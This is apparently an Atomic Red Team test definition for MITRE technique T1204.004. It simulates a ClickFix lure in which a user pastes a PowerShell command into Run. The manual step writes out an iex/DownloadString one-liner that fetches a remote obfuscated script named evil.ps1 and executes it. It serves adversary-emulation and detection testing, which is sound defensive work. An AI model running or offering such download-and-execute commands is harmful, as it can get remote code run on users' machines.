attack_technique: T1204.004
display_name: Malicious Copy and Paste
atomic_tests:
  - name: Malicious Copy and Paste through Run.exe
    auto_generated_guid: cec8ad4e-0320-4984-a1ae-70ee398c9519
    description: "This test simulates a ClickFix attack where a user is asked to copy and paste a powershell command into run.exe. The powershell command uses Invoke-Expression to download and execute an obfuscated powershell file. Upon execution, a powershell window will open and display \"Hello World!\" for 30 seconds before closing. "
    supported_platforms:
      - windows
    executor:
      steps: |+
        1.Open run.exe by pressing windows+R or opening the search bar and looking for run.exe
        2.Copy the following command into the run.exe: iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1204.004/src/evil.ps1'))

      name: manual
      elevation_required: false
